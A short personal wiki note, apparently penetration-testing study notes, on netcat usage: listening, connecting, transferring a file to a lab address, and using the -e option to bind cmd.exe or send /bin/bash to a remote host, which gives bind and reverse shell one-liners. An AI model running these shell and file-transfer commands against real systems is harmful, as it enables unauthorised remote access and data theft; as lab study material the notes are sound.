@@ -1,0 +1,48 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-09T03:15:40-04:00
+
+====== netcat ======
+Created Saturday 09 May 2020
+
+
+====== ----listen ======
+nc -lvnp  {port}
+
+  -n to skip sns name resolution
+ -v vebosity
+ -l create a listener
+-p specify a listening port 
+
+
+
+====== ----connect ======
+--nc -nv  {ip}  {port}
+
+
+  -n to skip sns name resolution
+ -v vebosity
+ 
+
+
+====== transfering files ======
+
+--nc -nv 10.11.0.22 4444 < {filename}
+--nc -nlvp 4444 > {filename}
+
+====== -e (intresting ) ======
+
+allows exection of commands 
+ex..
+on windows 
+---nc -nlvp 4444 -e cmd.exe
+
+then on linux
+nc -nv {ip } {port }
+
+====== or ======
+
+in linux 
+--nc -nv {ip} 4444 -e /bin/bash
+on windows 
+nc -nlvp 4444
